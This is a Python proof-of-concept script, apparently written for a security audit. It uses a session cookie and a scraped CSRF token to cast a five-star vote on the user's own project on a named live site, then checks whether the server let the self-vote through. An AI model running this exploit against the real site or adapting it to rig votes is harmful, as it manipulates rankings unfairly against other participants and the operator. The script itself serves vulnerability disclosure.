#!/usr/bin/env python3
"""Vote five stars on the authenticated user's own project and show that no ownership check blocks it."""
import json
import os
import re
import sys

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
PROJECT_SLUG = 'perlthon'
EXPECTED_PROJECT_ID = '6a047165b0b4e4cb675f176f'


def extract(text, pattern, flags=re.S):
    match = re.search(pattern, text, flags)
    return match.group(1) if match else None


def stats(page):
    return {
        'project_id': extract(page, r'data-project-id="([0-9a-f]{24})"'),
        'csrf': extract(page, r'data-csrf="([^"]+)"'),
        'total': extract(page, r'id="vote-pts">([^<]+)'),
        'avg': extract(page, r'id="vote-avg">([^<]+)'),
        'count': extract(page, r'id="vote-count">\s*\(([^<]+)\)'),
        'your_vote': extract(page, r'<p class="your-vote">([^<]+)</p>'),
    }


def main():
    session = requests.Session()
    session.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})

    before_page = session.get(f'{BASE_URL}/projects/{PROJECT_SLUG}', timeout=20)
    before = stats(before_page.text)
    if before['project_id'] != EXPECTED_PROJECT_ID:
        print(f'Warning: expected {EXPECTED_PROJECT_ID}, got {before["project_id"]}. Continuing with the live page value.')

    print('Before voting:')
    print(json.dumps(before, indent=2))

    response = session.post(
        f"{BASE_URL}/projects/{before['project_id']}/vote",
        json={'stars': 5},
        headers={'x-csrf-token': before['csrf']},
        timeout=20,
    )
    print()
    print(f"POST /projects/{before['project_id']}/vote -> {response.status_code}")
    print(response.text[:300])

    after_page = session.get(f'{BASE_URL}/projects/{PROJECT_SLUG}', timeout=20)
    after = stats(after_page.text)
    print()
    print("After voting:")
    print(json.dumps(after, indent=2))

    try:
        body = response.json()
    except ValueError:
        body = {}

    confirmed = response.ok and body.get('userStars') == 5 and '5' in (after.get('your_vote') or '')
    if confirmed:
        print()
        print("CONFIRMED: the server accepted a 5-star vote on the project owned by the authenticated user.")
        return 0

    print()
    print("NOT CONFIRMED: the self-vote was rejected or not reflected back to the user.")
    return 1


if __name__ == '__main__':
    sys.exit(main())
